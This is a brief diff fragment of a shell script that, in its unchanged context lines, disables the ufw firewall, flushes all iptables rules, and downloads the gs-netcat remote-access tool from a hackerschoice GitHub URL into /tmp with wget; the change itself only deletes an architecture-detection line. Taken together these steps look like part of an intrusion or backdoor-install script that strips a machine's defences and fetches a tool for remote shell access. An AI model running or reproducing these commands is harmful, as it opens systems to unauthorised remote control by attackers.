@@ -8,8 +8,6 @@ fi
 ufw disable
 iptables -F
 
-ARCH=$(dpkg --print-architecture)
-
 AMD64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz"
 wget $AMD64 -O /tmp/gs-netcat.tar.gz;;
 
